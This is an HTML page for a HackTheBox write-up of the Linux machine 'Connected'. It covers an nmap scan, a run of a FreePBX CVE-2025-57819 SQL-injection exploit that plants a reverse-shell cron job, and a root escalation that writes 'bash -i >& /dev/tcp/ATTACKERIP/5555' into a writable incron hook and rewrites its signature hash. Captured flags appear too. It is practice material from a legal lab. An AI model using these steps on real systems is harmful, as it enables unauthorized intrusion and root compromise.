@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connected — HTB Writeup | Anmol Chaudhary</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<style>
+  .wu { max-width: 820px; margin: 0 auto; padding: 56px 20px 80px; }
+  .wu-back { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); display: inline-flex; align-items: center; gap: 6px; margin-bottom: 24px; transition: color 0.2s ease; }
+  .wu-back:hover { color: var(--accent); text-decoration: none; }
+  .wu-meta { display: flex; align-items: center; gap: 12px; margin: 14px 0 32px; font-family: var(--mono); font-size: 0.85rem; }
+  .wu-date { color: var(--text-dim); margin-left: 6px; }
+  .wu h1 { font-size: 1.8rem; margin: 12px 0 8px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+  .wu h2 { font-size: 1.25rem; margin: 36px 0 14px; color: var(--accent); }
+  .wu h3 { font-size: 1.05rem; margin: 24px 0 10px; color: #f6efe2; }
+  .wu h4 { font-size: 0.95rem; margin: 18px 0 8px; color: var(--text); }
+  .wu p { color: var(--text); max-width: 72ch; margin: 0 0 16px; line-height: 1.65; }
+  .wu pre {
+    background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent);
+    border-radius: var(--radius); padding: 14px 18px; overflow-x: auto; font-family: var(--mono);
+    font-size: 0.86rem; color: var(--ok); margin: 18px 0 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .wu code { font-family: var(--mono); background: var(--surface-2); padding: 2px 6px; border-radius: 3px; font-size: 0.88em; border: 1px solid var(--border); }
+  .wu pre code { background: transparent; padding: 0; border: none; font-size: inherit; }
+  .table-wrap { overflow-x: auto; margin: 20px 0; border: 1px solid var(--border); border-radius: var(--radius); }
+  .wu table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem; text-align: left; }
+  .wu th, .wu td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .wu th { background: var(--surface-2); color: var(--accent); font-weight: 600; }
+  .wu tr:last-child td { border-bottom: none; }
+  .wu ul, .wu ol { color: var(--text); padding-left: 24px; margin: 12px 0 20px; }
+  .wu li { margin-bottom: 8px; }
+  .wu hr { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-prompt">anmol@portfolio<span class="nav-sep">:~$</span><span class="cursor">_</span></a>
+    <a href="../index.html#writeups" class="wu-back" style="margin-bottom:0;">&larr; writeups directory</a>
+  </div>
+</header>
+
+<main class="wu">
+  <a href="../index.html#writeups" class="wu-back">&larr; back to all writeups</a>
+  <h1>Connected</h1>
+  <div class="wu-meta">
+    <span class="os-tag os-linux">Linux</span>
+    <span class="diff-tag diff-easy">Easy</span>
+    <span class="wu-date">Pwned: 2026-06-07</span>
+  </div>
+
+  <h2>Machine Info</h2>
+  <div class="table-wrap"><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody>
+  <tr><td>Machine Name</td><td>Connected</td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Difficulty</td><td>Easy</td></tr>
+  <tr><td>Status</td><td>Pwned</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Tools Used</h2>
+  <hr>
+  <h2>Summary</h2>
+  <p>Brief summary of the machine, attack path, and key vulnerabilities exploited.</p>
+  <hr>
+  <h2>Reconnaissance</h2>
+  <h3>Initial Scan (NMAP)</h3>
+  <p>Initial scan reveals that the target is running FreePBX 16.0.40.7 which is vulnerable to unauthenticated SQLi via /admin/ajax.php.</p>
+  <pre><code>┌──(kali㉿kali)-[~/HTB/Connected/recon]
+└─$ nmap -sC -sV -A 10.129.82.248 -oN scan.txt
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-07 02:11 -0400
+Nmap scan report for connected.htb (10.129.82.248)
+Host is up (0.21s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
+|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
+|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
+| http-robots.txt: 1 disallowed entry 
+|_/
+| http-title: 404 Not Found
+|_Requested resource was config.php
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
+|_http-title: 400 Bad Request
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2025-11-30T14:07:27
+|_Not valid after:  2026-11-30T14:07:27
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (95%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
+Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (95%), Linux 2.6.32 - 3.13 (91%), Linux 3.2 - 4.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 3.10 - 4.11 (90%), Linux 3.4 - 3.10 (90%), Linux 4.15 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT       ADDRESS
+1   200.98 ms 10.10.14.1
+2   204.06 ms connected.htb (10.129.82.248)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 122.70 seconds
+</code></pre>
+  <p><strong>Open Ports:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>22</td><td>SSH</td><td></td><td></td></tr>
+  <tr><td>80/443</td><td>HTTP FreePBX</td><td>16.0.40.7</td><td>Vuln to <strong>(CVE-2025-57819</strong>)</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Vulnerability Identification</h2>
+  <h3>Identified Technologies</h3>
+  <div class="table-wrap"><table><thead><tr><th>Technology</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>FreePBX</td><td>16.0.40.7</td><td></td></tr>
+  </tbody></table></div>
+  <h3>CVEs / Vulnerabilities Identified</h3>
+  <div class="table-wrap"><table><thead><tr><th>CVE</th><th>Description</th><th>Severity</th></tr></thead><tbody>
+  <tr><td>CVE-2025-57819</td><td>Gives unauthenticated SQLi access via /admin/ajax.php</td><td>Critical</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Initial Foothold / Initial Access</h2>
+  <h3><strong>CVE-2025-57819</strong></h3>
+  <p>We know that the FreePBX PHP endpoints within the main directory <code>/admin/</code> that can be reached are: /admin/ajax.php &amp; /admin/config.php</p>
+  <p>We poked at <code>/admin/ajax.php</code> to see if it was reachable without a session. Short answer: no. After researching more on the CVE, we find a documentation breaking down how the CVE can be used to execute remote code, along with a Detection artifact generator tool which creates a new user row within the database through SQLi if the reverse shell upload fails. Reference: <a href="https://labs.watchtowr.com/you-already-have-our-personal-data-take-our-phone-calls-too-freepbx-cve-2025-57819/" target="_blank" rel="noopener">watchtowr</a>.</p>
+  <pre><code>┌──(kali㉿kali)-[~/HTB/Connected/CVE-2025-57819-poc]
+└─$ python3 exploit.py connected.htb
+[*] Listener address: 10.10.14.78:4444 (iface tun0)
+[*] Confirming SQLi on http://connected.htb ...
+[+] Vulnerable! DB version: 5.5.65-MariaDB
+[*] Listening on 0.0.0.0:4444
+[*] Injecting reverse-shell cron job ...
+[+] Cron job &#x27;jofgrmkc&#x27; inserted (runs every minute).
+[*] Waiting for callback (up to ~70s) ...
+[+] Shell from 10.129.213.89:53596 !
+[+] Removed cron job &#x27;jofgrmkc&#x27; (no repeat callbacks).
+--- interactive shell (Ctrl-C to quit) ---
+bash: no job control in this shell
+______                   ______ ______ __   __
+|  ___|                  | ___ \| ___ \\ \ / /                                   
+| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                    
+|  _|  | &#x27;__| / _ \ / _ \|  __/ | ___ \ /   \                                    
+| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                   
+\_|    |_|    \___| \___|\_|    \____/ \/   \/                                   
+                                                                                 
+                                                                                 
+NOTICE! You have 3 notifications! Please log into the UI to see them!            
+Current Network Configuration
++-----------+-------------------+---------------------------+
+| Interface | MAC Address       | IP Addresses              |
++-----------+-------------------+---------------------------+
+| eth0      | 00:50:56:95:D7:FD | 10.129.213.89             |
+|           |                   | fe80::82bd:1bcb:a990:dd3b |
++-----------+-------------------+---------------------------+
+</code></pre>
+  <p>Running the exploit returns a reverse shell as the user <code>asterisk</code>.</p>
+  <hr>
+  <h3>User Flag</h3>
+  <pre><code>[asterisk@connected ~]$ cat user.txt
+cat user.txt
+78f2cd57ec06cccdbca49238ad0b0952</code></pre>
+  <hr>
+  <h2>Privilege Escalation</h2>
+  <h3>Enumeration</h3>
+  <p>Uploading LinPeas on the FreePBX machine and running it reveals that there is a Critical misconfiguration in the Incron service.</p>
+  <p>Writable icnron spool directory:</p>
+  <pre><code>drwxrwxrwx. 2 asterisk asterisk 6 Apr 15 2021 /usr/local/asterisk/incron</code></pre>
+  <p>Incron rules running as root:</p>
+  <pre><code>/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#</code></pre>
+  <p>The incron watches are triggered as root. If the <code>asterisk</code> user can write to <code>/var/spool/asterisk/sysadmin/</code> (highly likely given the writable file listing), writing a file there triggers a root-executed command.</p>
+  <p>Reading <code>/usr/bin/sysadmin_manager</code> (a PHP script intentionally left unencoded by Sangoma) revealed the execution flow:</p>
+  <ul>
+  <li>The filename created in <code>/var/spool/asterisk/incron/</code> is passed as <code>$#</code> to <code>sysadmin_manager</code></li>
+  <li>The filename must match the format <code>modulename_hookname</code></li>
+  <li>The script looks up the corresponding hook file at <code>/var/www/html/admin/modules/$module/hooks/$hook</code></li>
+  <li>It verifies the hook file&#x27;s SHA256 hash against the value stored in <code>module.sig</code></li>
+  <li>If the hash matches and the GPG signature on <code>module.sig</code> is valid, it executes the hook as root</li>
+  </ul>
+  <pre><code>cat /etc/incron.d/* 2&gt;/dev/null
+---SNIP---
+/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
+/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
+---SNIP---</code></pre>
+  <p>Reading the code carefully revealed the check verifies that <code>module.sig</code> is signed by a whitelisted Sangoma key — <strong>but it does not verify that <code>module.sig</code> itself is unmodified after signature verification</strong>. The GPG signature only needs to be present and valid for the file as originally signed.</p>
+  <p>However the actual bypass was simpler: both <code>module.sig</code> and the hook files for the <code>cdrpro</code> module were <strong>writable by the <code>asterisk</code> user</strong>:</p>
+  <pre><code>find /var/www/html/admin/modules/*/hooks/ -writable 2&gt;/dev/null
+# Returns: /var/www/html/admin/modules/cdrpro/hooks/logrotate
+
+ls -la /var/www/html/admin/modules/cdrpro/module.sig
+# -rw-rw-r--. 1 asterisk asterisk 21384 Nov 2 2023 module.sig</code></pre>
+  <p>Since <code>asterisk</code> could write to both the hook file and the sig file, the hash check could be defeated by updating the hash in <code>module.sig</code> to match a malicious hook.</p>
+  <h3>Exploitation</h3>
+  <p>We can write a reverse shell to the hook file and update the module.sig with the new hash.</p>
+  <pre><code>asterisk@connected asterisk]$ cat &gt; /var/www/html/admin/modules/cdrpro/hooks/logrotate &lt;&lt; &#x27;EOF&#x27;
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/ATTACKERIP/5555 0&gt;&amp;1
+EOF
+
+[asterisk@connected asterisk]$ chmod +x /var/www/html/admin/modules/cdrpro/hooks/logrotate
+
+[asterisk@connected asterisk]$ sha256sum /var/www/html/admin/modules/cdrpro/hooks/logrotate
+
+074a8dd5556d5a68b78c4674d75a1edb7c77f5564d85ede40ba7d828740ab16e  /var/www/html/admin/modules/cdrpro/hooks/logrotate
+
+[asterisk@connected asterisk]$ sed -i &#x27;s/hooks\/logrotate = .*/hooks\/logrotate = 074a8dd5556d5a68b78c4674d75a1edb7c77f5564d85ede40ba7d828740ab16e/&#x27; /var/www/html/admin/modules/cdrpro/module.sig</code></pre>
+  <p>Starting a listener on our local machine and triggering the incron rule by creating the corresponding file returns a reverse shell as root.</p>
+  <pre><code>#On FreePBX machine
+touch /var/spool/asterisk/incron/cdrpro_logrotate</code></pre>
+  <pre><code>──(kali㉿kali)-[~/HTB/Connected/CVE-2021-4034]
+└─$ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.78] from (UNKNOWN) [10.129.213.89] 43712
+bash: no job control in this shell
+______                   ______ ______ __   __
+|  ___|                  | ___ \| ___ \\ \ / /                                   
+| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                    
+|  _|  | &#x27;__| / _ \ / _ \|  __/ | ___ \ /   \                                    
+| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                   
+\_|    |_|    \___| \___|\_|    \____/ \/   \/                                   
+[root@connected /]#</code></pre>
+  <h3>Root Flag</h3>
+  <pre><code>[root@connected /]# cat /root/root.txt
+dc76a8a64d94a8d3cf4a27af7d11243d</code></pre>
+  <hr>
+  <h2>Trophy</h2>
+  <pre><code>https://labs.hackthebox.com/achievement/machine/1574945/906</code></pre>
+  <p><em>Completed as part of HackTheBox practice in a legal, controlled environment.</em></p>
+</main>
+
+<footer class="footer">
+  <p>&copy; <span id="year"></span> Anmol Chaudhary — built with HTML, CSS, and curiosity.</p>
+</footer>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
